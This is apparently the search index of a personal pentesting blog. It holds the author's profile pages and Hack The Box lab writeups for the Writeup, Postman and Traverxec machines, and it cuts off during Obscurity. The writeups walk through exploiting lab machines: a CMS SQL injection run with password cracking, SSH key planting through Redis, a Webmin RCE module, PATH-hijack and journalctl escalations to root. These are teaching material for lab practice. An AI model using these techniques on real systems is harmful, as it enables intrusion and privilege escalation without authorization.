{"0": {
    "doc": "Roadmap",
    "title": "Roadmap",
    "content": "# Roadmap and achievements ## 2021 06/2021 - Certified **[Offensive Security Certified Professional (OSCP)](https://www.credly.com/badges/4d593371-2011-42f2-a299-f75cf614d881)** 05/2021 - Achieved **Pro Hacker** rank on **HackTheBox** 05/2021 - Completed **Windows Privilege Escalation for OSCP & Beyond!** Udemy course 05/2021 - Completed **Windows Privilege Escalation for Beginners** Udemy course 02/2021 - Started **PEN-200** (ex PWK) course ## 2020 09/2020 - Become **Moderator** on [Inforge.net](https://www.inforge.net/) ## 2019 09/2019 - Hired as **Penetration Tester** ## 2018 10/2018 - Achieved **Hacker** rank on **HackTheBox** 04/2018 - Completed **PTSv4** (eLearnSecurity) course ## 2017 09/2017 - Hired as **Software Developer** 07/2017 - **ICT high school diploma** {% include support_btn.html %} ",
    "url": "https://maoutis.github.io/achievements/",
    "relUrl": "/achievements/"
  },"1": {
    "doc": "About me",
    "title": "About me",
    "content": ". ## Whoami ``` maoutis@kali:~# whoami I am Mattia, aka 0xbro aka maoutis, a Penetration Tester & a cyber security enthusiast. I love everything that can be related to hacking, reversing, disassembling etc. I am also a CTF lover! My strengths: Learner, Intellection, Achiever, Analytical ``` ## About the blog ``` maoutis@kali:~# ./ab0utTh3Bl0g.sh In addition to hacking, I also like to document and share the knowledge I have learned during my sessions, so that I can also help others. Within the blog you can find writeups of the various machines I owned, my CTFs and Penetration Testing notes and other useful material such as links to various forums, link to discussions I found interesting, articles, etc. ``` ## My certifications and badges ## HTB Profile [HTB profile (old)](https://www.hackthebox.eu/profile/88083){: .btn .btn-green } [HTB profile (new)](https://app.hackthebox.eu/profile/88083){: .btn .btn-green } {% include support_btn.html %} ",
    "url": "https://maoutis.github.io/about/",
    "relUrl": "/about/"
  },"2": {
    "doc": "Contact me",
    "title": "Contact me",
    "content": "{% include support_btn.html %} ## Contact me [Send me an email](mailto:{{site.email}}){: .btn } [Text me on Telegram](https://t.me/{{site.telegram_username}}){: .btn .btn-blue } ## Follow me on my socials Follow @0xbro [Get in touch on Linkedin](https://www.linkedin.com/in/{{site.linkedin_public_url}}){: .btn .btn-green } [See my videos on YouTube](https://www.youtube.com/channel/{{site.youtube_id}}){: .btn .btn-purple } ",
    "url": "https://maoutis.github.io/contacts/",
    "relUrl": "/contacts/"
  },"3": {
    "doc": "Home",
    "title": "Home",
    "content": "# Welcome! I'm **0xbro**, this is my personal blog dedicated to cyber security topics, CTFs and everything else I'm interested in. If you want to know more about me or want to get in touch with me, please visit the About Me page. {% include HTB_Card.html %} ## Recent Writeups . {% assign filtered_writeups = site.writeups | where: \"has_children\", false | sort: \"date\" | reverse %} {% for writeup in filtered_writeups limit:5%} | {{writeup.parent}} - {{ writeup.title }} | {% endfor %} . ## Recent Post and Articles . {% assign filtered_posts = site.posts | where: \"has_children\", false %} {% for post in filtered_posts limit:5%} | {{ post.title }} | {% endfor %} . {% include support_btn.html %} ",
    "url": "https://maoutis.github.io/",
    "relUrl": "/"
  },"4": {
    "doc": "Support me!",
    "title": "Support me!",
    "content": "# Support me Are you enjoying my contents and want to support my work? {% include support_btn.html %} ",
    "url": "https://maoutis.github.io/support-me/",
    "relUrl": "/support-me/"
  },"5": {
    "doc": "Roadmap",
    "title": "Roadmap",
    "content": "# Roadmap and achievements ## 2021 06/2021 - Certified **[Offensive Security Certified Professional (OSCP)](https://www.credly.com/badges/4d593371-2011-42f2-a299-f75cf614d881)** 05/2021 - Achieved **Pro Hacker** rank on **HackTheBox** 05/2021 - Completed **Windows Privilege Escalation for OSCP & Beyond!** Udemy course 05/2021 - Completed **Windows Privilege Escalation for Beginners** Udemy course 02/2021 - Started **PEN-200** (ex PWK) course ## 2020 09/2020 - Become **Moderator** on [Inforge.net](https://www.inforge.net/) ## 2019 09/2019 - Hired as **Penetration Tester** ## 2018 10/2018 - Achieved **Hacker** rank on **HackTheBox** 04/2018 - Completed **PTSv4** (eLearnSecurity) course ## 2017 09/2017 - Hired as **Software Developer** 07/2017 - **ICT high school diploma** {% include support_btn.html %} ",
    "url": "https://maoutis.github.io/achievements/",
    "relUrl": "/achievements/"
  },"6": {
    "doc": "About me",
    "title": "About me",
    "content": ". ## Whoami ``` maoutis@kali:~# whoami I am Mattia, aka 0xbro aka maoutis, a Penetration Tester & a cyber security enthusiast. I love everything that can be related to hacking, reversing, disassembling etc. I am also a CTF lover! My strengths: Learner, Intellection, Achiever, Analytical ``` ## About the blog ``` maoutis@kali:~# ./ab0utTh3Bl0g.sh In addition to hacking, I also like to document and share the knowledge I have learned during my sessions, so that I can also help others. Within the blog you can find writeups of the various machines I owned, my CTFs and Penetration Testing notes and other useful material such as links to various forums, link to discussions I found interesting, articles, etc. ``` ## My certifications and badges ## HTB Profile [HTB profile (old)](https://www.hackthebox.eu/profile/88083){: .btn .btn-green } [HTB profile (new)](https://app.hackthebox.eu/profile/88083){: .btn .btn-green } {% include support_btn.html %} ",
    "url": "https://maoutis.github.io/about/",
    "relUrl": "/about/"
  },"7": {
    "doc": "Contact me",
    "title": "Contact me",
    "content": "{% include support_btn.html %} ## Contact me [Send me an email](mailto:{{site.email}}){: .btn } [Text me on Telegram](https://t.me/{{site.telegram_username}}){: .btn .btn-blue } ## Follow me on my socials Follow @0xbro [Get in touch on Linkedin](https://www.linkedin.com/in/{{site.linkedin_public_url}}){: .btn .btn-green } [See my videos on YouTube](https://www.youtube.com/channel/{{site.youtube_id}}){: .btn .btn-purple } ",
    "url": "https://maoutis.github.io/contacts/",
    "relUrl": "/contacts/"
  },"8": {
    "doc": "Home",
    "title": "Home",
    "content": "# Welcome! I'm **0xbro**, this is my personal blog dedicated to cyber security topics, CTFs and everything else I'm interested in. If you want to know more about me or want to get in touch with me, please visit the About Me page. {% include HTB_Card.html %} ## Recent Writeups . {% assign filtered_writeups = site.writeups | where: \"has_children\", false | sort: \"date\" | reverse %} {% for writeup in filtered_writeups limit:5%} | {{writeup.parent}} - {{ writeup.title }} | {% endfor %} . ## Recent Post and Articles . {% assign filtered_posts = site.posts | where: \"has_children\", false %} {% for post in filtered_posts limit:5%} | {{ post.title }} | {% endfor %} . {% include support_btn.html %} ",
    "url": "https://maoutis.github.io/",
    "relUrl": "/"
  },"9": {
    "doc": "Support me!",
    "title": "Support me!",
    "content": "# Support me Are you enjoying my contents and want to support my work? {% include support_btn.html %} ",
    "url": "https://maoutis.github.io/support-me/",
    "relUrl": "/support-me/"
  },"10": {
    "doc": "HackTheBox",
    "title": "Hack The Box: Writeups",
    "content": "Here there are many writeups for different Hack The Box machines. I hope you will find them useful. In case of advice, feel free to contact me. | Tenet [Medium] 2021, 12 June . | ScriptKiddie [Easy] 2021, 5 June . | Delivery [Easy] 2021, 22 May . | Ready [Medium] 2021, 14 May . | Tabby [Easy] 2020, 5 July . | Blunder [Easy] 2020, 30 May . | Traceback [Easy] 2020, 14 March . | OpenAdmin [Easy] 2020, 4 January . | Obscurity [Medium] 2019, 30 November . | Traverxec [Easy] 2019, 16 November . | Postman [Easy] 2019, 2 November . | Writeup [Easy] 2019, 8 June . | . Made by 0xbro with üíú üíõ . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/#hack-the-box-writeups",
    "relUrl": "/writeups/HackTheBox/#hack-the-box-writeups"
  },"11": {
    "doc": "HackTheBox",
    "title": "HackTheBox",
    "content": " ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/",
    "relUrl": "/writeups/HackTheBox/"
  },"12": {
    "doc": "Writeup",
    "title": "HackTheBox - Writeup [Easy] ",
    "content": "#HacktheBox #Linux #Easy #CMS-Made-Simple #SQL-injection #binary-hijacking-privesc #B2R . . | Improved ability: | Used tools: | Introduction &amp; Foothold: | Gaining access as jkr | Privilege Escalation | Trophy | . Improved ability: . | CVE Research | Source code review | $PATH based privilege escalation | . Used tools: . | nmap | searchsploit | pspy64 | . Introduction &amp; Foothold: . Let‚Äôs start with a common full nmap scan on the box: . $ nmap -A 10.10.10.138 . The only available ports are the port 22 (with OpenSSH 7.4p1) and the port 80, running Apache httpd 2.4.25. Because of this version of OpenSSH doesn‚Äôt have known vulnerability, let‚Äôs analyse the root and /writeup/ folder (contained into the robots.txt) with a web browser. Once inside the root, we will prompted with an old-school floppy-disk background and a tips saying that because the site was attacked, it has been implemented a DoS protection that potentially can block us from performing brute-force enumeration. Let‚Äôs move analyse the /writeup/ folder: . Here we can find some old writeups, but nothing very useful. However, looking at the source code, we are able to find the first important information: the CMS type. Now that we know our target use CMS Made Simple, we can search online for public exploit. Suddenly, though the usage of searchsploit we found the right script to compromise our target . $ searchsploit 'cms made simple' -------------------------------------------------------------------------------------------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------------------- CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit) | exploits/php/remote/46627.rb CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion | exploits/php/webapps/26217.html CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting | exploits/php/webapps/26298.txt CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting | exploits/php/webapps/29272.txt ... CMS Made Simple &lt; 2.2.10 - SQL Injection | exploits/php/webapps/46635.py . Gaining access as jkr . Analysing every record, notice how the SQL injection exploit (46635) is valid for every version under the 2.2.10. Download and execute the script! . $ searchsploi -m 46635 $ python 46635.py -u http://10.10.10.138/writeup/ --crack -w /usr/share/wordlist/rockyou.txt [+] Salt for password found: 5a599ef579066807 [+] Username found: jkr [+] Email found: jkr@writeup.htb [+] Password found: 62def4866937f08cc13bab43bb14e6f7 [+] Password cracked: raykayjay9 . Good! We have the user password. Now we can login into the box as jkr and proceeds to the privilege escalation phase. $ ssh jkr@10.10.10.138 $ cat /home/jkr/user.txt d4e493fd4068af... Privilege Escalation . After looking for a long time for passwords, misconfiguration or other forms of escalation, I decided to take a closer look to every process running on the machine, so I downloaded pspy and launched it. After a while, mine attention were caught by these few lines: . 2019/10/11 10:35:58 CMD: UID=0 PID=2279 | sshd: [accepted] 2019/10/11 10:35:58 CMD: UID=102 PID=2280 | sshd: [net] 2019/10/11 10:36:00 CMD: UID=0 PID=2281 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 2019/10/11 10:36:00 CMD: UID=0 PID=2282 | run-parts --lsbsysinit /etc/update-motd.d 2019/10/11 10:36:00 CMD: UID=0 PID=2283 | /bin/sh /etc/update-motd.d/10-uname 2019/10/11 10:36:00 CMD: UID=0 PID=2284 | /bin/sh /etc/update-motd.d/10-uname 2019/10/11 10:36:00 CMD: UID=0 PID=2285 | sshd: jkr [priv] . It seems that every time someone logs in, the /etc/update-motd.d/10-uname script is executed. The contents of the scripts are the following: . jkr@writeup:/etc/update-motd.d$ cat 10-uname #!/bin/sh uname -rnsom jkr@writeup:/etc/update-motd.d$ uname -rnsom Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux . It is clear the script execute a uname without using any kind of path, searching the right binary into the $PATH variable. In case we are able to write inside one of the directories contained in $PATH and before the script identifies the original uname binary, we can run arbitrary code as root and execute our escalation (that because the 10-uanme process run with UID=0, so it runs as root) . $PATH contains the following directories: . jkr@writeup:/home/jkr$ ls -l -d /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin drwxr-xr-x 2 root root 4096 Apr 19 04:24 /bin drwxr-xr-x 2 root root 4096 Apr 19 04:14 /sbin drwxr-xr-x 2 root root 20480 Apr 24 13:13 /usr/bin drwx-wsr-x 2 root staff 20480 Jul 10 17:27 /usr/local/bin drwx-wsr-x 2 root staff 12288 Jul 10 17:23 /usr/local/sbin drwxr-xr-x 2 root root 4096 Apr 19 07:31 /usr/sbin . two of which allow staff group users to write into them. Because jkr is part of the staff group, we are able to create a custom script named uname that will be executed in place of the original script once someone logs in. jkr@writeup:/etc/update-motd.d$ echo \"cat /root/root.txt\" &gt; /usr/local/sbin/uname jkr@writeup:/etc/update-motd.d$ chmod +x /usr/local/sbin/uname jkr@writeup:/etc/update-motd.d$ exit root@0xbro:~/Documents/CTF/HTB/Writeup# ssh jkr@10.10.10.138 jkr@10.10.10.138 password: eeba47f60b48ef92... The programs included with the Devuan GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/copyright. Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Wed Jul 10 17:35:19 2019 from 10.10.15.117 jkr@writeup:~$ . Once this escalation has been found, it is possible get a reverse shell as root rather than performing other actions as superuser. Trophy . The only way of discovering the limits of the possible is to venture a little way past them into the impossible. - Arthur C. Clarke . &lt;path d=\"M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z\" \"/&gt; . Share . Made by 0xbro with üíú üíõ . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2019-06-08-Writeup/",
    "relUrl": "/writeups/HackTheBox/2019-06-08-Writeup/"
  },"13": {
    "doc": "Writeup",
    "title": "Writeup",
    "content": "08 Jun 2019 | Reading time: ~5 min . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2019-06-08-Writeup/",
    "relUrl": "/writeups/HackTheBox/2019-06-08-Writeup/"
  },"14": {
    "doc": "Postman",
    "title": "HackTheBox - Postman [Easy] ",
    "content": "#HackTheBox #Easy #Linux #redis #ssh-keys-cracking #webmin #miniserv #lateral-movement #RCE #CVE-2019-12840 #B2R . . | Improved ability: | Used tools: | Introduction &amp; Foothold | Lateral movement to Matt | Privilege Escalation | Trophy | . Improved ability: . | Redis exploitation | SSH keys cracking | Webmin exploitation | . Used tools: . | nmap | LinEnum.sh | ssh2john | john | metasploit | . Introduction &amp; Foothold . As always, let‚Äôs start scanning the box with namp . $ nmap -sV -O -A -p 1-10000 --script=banner -o nmap.txt 10.10.10.160 # Nmap 7.80 scan initiated Wed Feb 26 21:38:20 2020 as: nmap -sV -O -A -p 1-10000 --script=banner -o nmap.txt 10.10.10.160 Nmap scan report for 10.10.10.160 Host is up (0.047s latency). Not shown: 9996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) 6379/tcp open redis Redis key-value store 4.0.9 10000/tcp open http MiniServ 1.910 (Webmin httpd) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=2/26%OT=22%CT=1%CU=38345%PV=Y%DS=2%DC=T%G=Y%TM=5E56D77 OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 110/tcp) HOP RTT ADDRESS 1 46.46 ms 10.10.14.1 2 46.53 ms 10.10.10.160 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Feb 26 21:39:17 2020 -- 1 IP address (1 host up) scanned in 57.09 seconds . We can notice the presence of four open ports: two web server on the numbers 80 and 1000 and a Redis daemon on the number 6379. Enumerating the two web services, we discovered that for this specific version of MiniServ multiple authenticated exploits exists‚Ä¶ they could come in handy later. About Redis, we can enumerate the service through some NSE scripts, however without getting anything useful except the specific Linux box version (Linux 4.15.0-58-generic x86_64) . $ nmap --script redis-info -sV -p 6379 10.10.10.160 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-26 22:20 CET Nmap scan report for 10.10.10.160 Host is up (0.047s latency). PORT STATE SERVICE VERSION 6379/tcp open redis Redis key-value store 4.0.9 (64 bits) | redis-info: | Version: 4.0.9 | Operating System: Linux 4.15.0-58-generic x86_64 | Architecture: 64 bits | Process ID: 608 | Used CPU (sys): 81.29 | Used CPU (user): 27.25 | Connected clients: 2 | Connected slaves: 0 | Used memory: 840.94K | Role: master | Bind addresses: | 0.0.0.0 | ::1 | Client connections: | 10.10.14.12 |_ 10.10.14.27 . About Redis: . Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker. In order to works properly, the program needs a specific user, who can read and write on physical memory ‚Ä¶ in short, a 100% working user. Because of that, once we log into the service, we can read and write into the redis /home directory, and because we know that the user has a valid shell and a valid home, we can inject our personal SSH key in order to gain access through SSH without knowing the right password. First, I generated a new pair of SSH key with the ssh-keygen command, next, inside the redis home directory, I created the **/.ssh **dir and the authorized_keys file, inside of which I wrote my public SSH key. After those steps, finally I was able to login as redis user, without really know its password. Lateral movement to Matt . As always, upload and run LinEnum.sh . redis@Postman:/tmp$ ./LinEnum.sh ######################################################### Local Linux Enumeration &amp; Privilege Escalation Script ######################################################### #www.rebootuser.com #version 0.982 [-] Debug Info [+] Thorough tests = Disabled Scan started at: Thu Feb 27 09:44:23 GMT 2020 ###SYSTEM############################################## [-] Kernel information: Linux Postman 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux [-] Kernel information (continued): Linux version 4.15.0-58-generic (buildd@lcy01-amd64-013) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 [-] Specific release information: DISTRIB_ID=Ubuntu DISTRIB_RELEASE=18.04 DISTRIB_CODENAME=bionic DISTRIB_DESCRIPTION=\"Ubuntu 18.04.3 LTS\" NAME=\"Ubuntu\" VERSION=\"18.04.3 LTS (Bionic Beaver)\" ID=ubuntu ID_LIKE=debian PRETTY_NAME=\"Ubuntu 18.04.3 LTS\" VERSION_ID=\"18.04\" HOME_URL=\"https://www.ubuntu.com/\" SUPPORT_URL=\"https://help.ubuntu.com/\" BUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\" PRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\" VERSION_CODENAME=bionic UBUNTU_CODENAME=bionic [-] Hostname: Postman ... [-] Location and Permissions (if accessible) of .bak file(s): -rwxr-xr-x 1 Matt Matt 1743 Aug 26 2019 /opt/id_rsa.bak -rw------- 1 root root 695 Aug 25 2019 /var/backups/group.bak -rw------- 1 root shadow 577 Aug 25 2019 /var/backups/gshadow.bak -rw------- 1 root shadow 935 Aug 26 2019 /var/backups/shadow.bak -rw------- 1 root root 1382 Aug 25 2019 /var/backups/passwd.bak [-] Any interesting mail in /var/mail: total 8 drwxrwsr-x 2 root mail 4096 Aug 24 2019 . drwxr-xr-x 13 root root 4096 Aug 25 2019 .. ###SCAN COMPLETE#################################### . Among the thousands of lines of information returned by the tool, we notice immediately that there is a publicly readable RSA-key‚Äôs backup file belonging to Matt, the user of the machine. Extrapolate and bring it on our local machine in order to try to crack it. In order to crack an SSH key, first we need to generate an hash from it. To achieve this tasks, we can use ssh2john. Next, after having generate the hash, we can crack it using john: . Gathered the password, try logging in via SSH with Matt user ‚Ä¶ but it does not work. Not a problem, because the same password is valid for switching to the Matt user with the su command. Privilege Escalation . The privilege escalation process can be achieved easily with Metasploit. During the enumeration phase we found an authenticated Remote Command Execution exploit fitting the targeted Webmin version: https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/http/webmin_packageup_rce.md . This module exploits an arbitrary command execution vulnerability in Webmin 1.910 and lower versions. Any user authorized to the ‚ÄúPackage Updates‚Äù module can execute arbitrary commands with root privileges via the data parameter to update.cgi. So let‚Äôs load the module, compile the appropriate fields and execute the exploit. What we will get is a shell with root permissions . Trophy . A hacker does for love what others would not do for money.&lt;br&gt; - Laura Creighton . &lt;path d=\"M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z\" \"/&gt; . Share . Made by 0xbro with üíú üíõ . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2019-11-02-Postman/",
    "relUrl": "/writeups/HackTheBox/2019-11-02-Postman/"
  },"15": {
    "doc": "Postman",
    "title": "Postman",
    "content": "02 Nov 2019 | Reading time: ~6 min . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2019-11-02-Postman/",
    "relUrl": "/writeups/HackTheBox/2019-11-02-Postman/"
  },"16": {
    "doc": "Traverxec",
    "title": "HackTheBox - Traverxec [Easy] ",
    "content": "#HackTheBox #Easy #Linux #nostromo #RCE #ssh-keys-cracking #GTFObins #CVE-2019-16278 #journalctl-privesc #B2R . . | Improved skills: | Used tools: | Introduction &amp; Foothold | Lateral movement to David | Privilege Escalation | Trophy | . Improved skills: . | nostromo exploitation | SSH keys cracking | journalctl privilege escalation (GTFO) | . Used tools: . | nmap | searchsploit | LinEnum.sh | hashcat | ssh2john | john | . Introduction &amp; Foothold . Let‚Äôs start to scan the box with nmap . $ nmap -O -A -sV --script=banner -oN nmap.txt 10.10.10.165 # Nmap 7.80 scan initiated Tue Feb 18 22:09:54 2020 as: nmap -O -A -sV --script=banner -oN nmap.txt 10.10.10.165 Nmap scan report for 10.10.10.165 Host is up (0.049s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) |_banner: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1 80/tcp open http nostromo 1.9.6 |_http-server-header: nostromo 1.9.6 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 48.90 ms 10.10.14.1 2 49.13 ms 10.10.10.165 OS and Service detection performed. Please report any incorrect results at [URL]https://nmap.org/submit/[/URL] . # Nmap done at Tue Feb 18 22:10:25 2020 -- 1 IP address (1 host up) scanned in 31.98 seconds . From the output above we can notice that there are only two services running on the box: OpenSSH on port 22 and a nostromo 1.9.6 running on the port 80. Taking a look to the web site we notice that it is made up only by static-pages. This reduce our attack surface. However, a rapid search online reveals that this particular web server version is vulnerable to an RCE vulnerability (CVE-2019-16278) and a public exploit exists (id 47837). All we have to do is download the exploit, create a listening server with netcat and get our reverse shell . Lateral movement to David . Now that we have a shell, we can take a look to which user the box has. We notice that the machine user is david. To speed up the post exploitation process, we can upload on our target LinEnum.sh and run it. The tools reveals that it found a password hash saved in the nostromo backup file /var/nostromo/conf/.htpasswd. We can try to crack it with hashcat while we perform some other recon. After few minutes hashcat reveals that the hashed password was Nowonly4me, however trying to use it around we find that it‚Äôs useless. Rabbit hole! . Browsing the configuration files of the web server some useful information come out from /var/nostromo/conf/nhttpd . From the configuration it seems that in /home directories may be present a public_www directory. Browsing the supposed folder not only we discover that it really exists, but also that inside it is contained an interesting folder called protected-file-area. Inside it we discovered a backup archive containing david SSH keys. Now we have to crack them so let‚Äôs create the hash of the private key with ssh2john and after we get it, let‚Äôs crack it with john: . Well done, we have found david‚Äôs SSH password. Now we can login via SSH and proceeds with the privesc phase. Privilege Escalation . Taking a look at the david‚Äôs home directory we noticed the bin folder, which contains two files inside, one of which is a script. We can see how the journalctl command is executed via sudo, and the result is then passed to the cat command to display it uniformly on the screen. I have searched far and wide for the web for a possible exploit for journalctl, but without finding anything. After a few hours of research, I landed on a page called GTFObins, where there was talks about different method to perform privilege escalation through the program in question and many others. Here is the link to the page: https://gtfobins.github.io/gtfobins/journalctl/. I quote what is said on the page: . ‚Ä¶ . This invokes the default pager, which is likely to be less, other functions may apply. In simple words: to display the output of the command on the screen, the journalctl program uses the less command by default (for this reason, in the script it was then redirected to the cat command). However, this command ‚Äúhas a defect‚Äù: once executed, it waits for a command from a user. In this situation, however, it is possible to escape from the less command. Since journalctl can be run with elevated privileges via the sudo command, using the feature of the less command it is possible to obtain a shell as root! . Now type :!/bin/bash and‚Ä¶ . ‚Ä¶ obtain a root shell! . Trophy . Everything is a copy of a copy of a copy. - Chuck Palahniuk, Fight Club . &lt;path d=\"M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z\" \"/&gt; . Share . Made by 0xbro with üíú üíõ . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2019-11-16-Traverxec/",
    "relUrl": "/writeups/HackTheBox/2019-11-16-Traverxec/"
  },"17": {
    "doc": "Traverxec",
    "title": "Traverxec",
    "content": "16 Nov 2019 | Reading time: ~7 min . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2019-11-16-Traverxec/",
    "relUrl": "/writeups/HackTheBox/2019-11-16-Traverxec/"
  },"18": {
    "doc": "Obscurity",
    "title": "HackTheBox - Obscurity [Medium] ",
    "content": "#HackTheBox #Medium #code-review #reversing #python-coding #cracking-shadow-file #custom-exploitation #B2R . . | Improved skills: | Used tools: | Introduction &amp; Foothold | Lateral movement to Robert | Privilege Escalation | Trophy | . Improved skills: . | Code review | Reversing | Python coding | Cracking shadow file | . Used tools: . | nmap | owasp zap | python | john | . Introduction &amp; Foothold . Obscurity is a medium difficulty Linux machine, containing completely custom components, which respects the proverb ‚ÄúSecurity through Obscurity‚Äù. Let‚Äôs start as always with a nmap port scan: . $ nmap -A -O --script=banner -o nmap.txt 10.10.10.168 # Nmap 7.80 scan initiated Fri Feb 21 22:01:19 2020 as: nmap -A -O --script=banner -o nmap.txt 10.10.10.168 Nmap scan report for 10.10.10.168 Host is up (0.048s latency). Not shown: 996 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3 8080/tcp open http-proxy BadHTTPServer | fingerprint-strings: | GetRequest, HTTPOptions: | HTTP/1.1 200 OK | Date: Fri, 21 Feb 2020 21:03:21 | Server: BadHTTPServer | Last-Modified: Fri, 21 Feb 2020 21:03:21 | Content-Length: 4171 | Content-Type: text/html | Connection: Closed | &lt;!DOCTYPE html&gt; | &lt;html lang=\"en\"&gt; | &lt;head&gt; | &lt;meta charset=\"utf-8\"&gt; | &lt;title&gt;0bscura&lt;/title&gt; | &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"&gt; | &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt; | &lt;meta name=\"keywords\" content=\"\"&gt; | &lt;meta name=\"description\" content=\"\"&gt; | &lt;!-- | Easy Profile Template | http://www.templatemo.com/tm-467-easy-profile | &lt;!-- stylesheet css --&gt; | &lt;link rel=\"stylesheet\" href=\"css/bootstrap.min.css\"&gt; | &lt;link rel=\"stylesheet\" href=\"css/font-awesome.min.css\"&gt; | &lt;link rel=\"stylesheet\" href=\"css/templatemo-blue.css\"&gt; | &lt;/head&gt; | &lt;body data-spy=\"scroll\" data-target=\".navbar-collapse\"&gt; | &lt;!-- preloader section --&gt; | &lt;!-- | &lt;div class=\"preloader\"&gt; |_ &lt;div class=\"sk-spinner sk-spinner-wordpress\"&gt; |_http-server-header: BadHTTPServer 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.80%I=7%D=2/21%Time=5E50452A%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,10FC,\"HTTP/1\\.1\\x20200\\x20OK\\nDate:\\x20Fri,\\x2021\\x20Feb\\x2020 SF:20\\x2021:03:21\\nServer:\\x20BadHTTPServer\\nLast-Modified:\\x20Fri,\\x2021\\ SF:x20Feb\\x202020\\x2021:03:21\\nContent-Length:\\x204171\\nContent-Type:\\x20t SF:ext/html\\nConnection:\\x20Closed\\n\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\" SF:en\\\"&gt;\\n&lt;head&gt;\\n\\t&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n\\t&lt;title&gt;0bscura&lt;/title&gt;\\ 